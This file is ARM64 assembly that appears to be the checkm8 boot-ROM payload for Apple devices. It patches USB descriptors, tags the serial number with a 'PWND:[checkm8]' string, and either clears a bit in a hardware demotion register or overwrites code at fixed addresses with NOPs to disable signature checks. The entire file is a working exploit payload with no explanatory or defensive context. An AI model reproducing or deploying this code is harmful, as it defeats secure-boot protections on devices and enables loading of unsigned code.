.text

.pool
.set gUSBSerialNumber,             0x180086CDC
.set gUSBSRNMStringDescriptor,     0x180080562
.set gUSBDescriptors,              0x180086B58
.set usb_create_string_descriptor, 0x10000BFEC

.set writeSignatureAddr1,          0x1000054e4
.set writeSignatureAddr2,          0x1000054b4

.set NOP,                          0xd503201f
.set MOV_W1_1,                     0x52800021
.set SRTB_W1_SP_167,               0x39029fe1
.set SRTB_W1_SP_169,               0x3902a7e1
.set SRTB_W1_SP_170,               0x3902abe1

.set demote_flag,                  0x41414141
.set gDemotionRegister,            0x20E02A000

.global _main
_main:
  MOV  X19, #0                      // HACK: do not free this usb request
  STP  X29, X30, [SP,#-0x10]!
  MOV  X29, SP

  LDR  X0, =gUSBDescriptors
  LDP  X0, X1, [X0]
  ADR  X2, USB_DESCRIPTOR
  LDP  X3, X4, [X2]
  STP  X3, X4, [X0]
  STP  X3, X4, [X1]
  LDP  X3, X4, [X2,#0x10]
  STP  X3, X4, [X0,#0x10]
  STP  X3, X4, [X1,#0x10]

  LDR  X0, =gUSBSerialNumber
find_zero_loop:
  ADD  X0, X0, #1
  LDRB W1, [X0]
  CBNZ W1, find_zero_loop

  ADR  X1, PWND_STRING
  LDP  X2, X3, [X1]
  STP  X2, X3, [X0]

  LDR  X0, =gUSBSerialNumber
  LDR  X1, =usb_create_string_descriptor
  BLR  X1

  LDR  X1, =gUSBSRNMStringDescriptor
  STRB W0, [X1]

  ldr w0, =demote_flag
  cmp w0, #1
  bne _sigcheck

_demotion:
  ldr x1, =gDemotionRegister
  ldr w0, [x1]
  tst w0, #1
  beq _end
  ldr w0, [x1]
  and w0, w0, #0xfffffffe
  str w0, [x1]
  b   _end

_sigcheck:
  LDR X0, =writeSignatureAddr1
  LDR W1, =NOP
  STR W1, [X0]

  LDR X0, =writeSignatureAddr2
  LDR W1, =MOV_W1_1
  STR W1, [X0]
  ADD X0, X0, #4
  LDR W1, =SRTB_W1_SP_167
  STR W1, [X0]
  ADD X0, X0, #4
  LDR W1, =NOP
  STR W1, [X0]
  ADD X0, X0, #4
  LDR W1, =SRTB_W1_SP_169
  STR W1, [X0]
  ADD X0, X0, #4
  LDR W1, =SRTB_W1_SP_170
  STR W1, [X0]
  ADD X0, X0, #4
  LDR W1, =NOP
  STR W1, [X0]
  ADD X0, X0, #4
  LDR W1, =NOP
  STR W1, [X0]
  ADD X0, X0, #4
  LDR W1, =NOP
  STR W1, [X0]
  ADD X0, X0, #4
  LDR W1, =NOP
  STR W1, [X0]

_end:
  SYS  #0, c7, c5, #0
  DSB  SY
  ISB

  LDP  X29, X30, [SP],#0x10
  RET

USB_DESCRIPTOR:
.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0

PWND_STRING:
.asciz " PWND:[checkm8]"
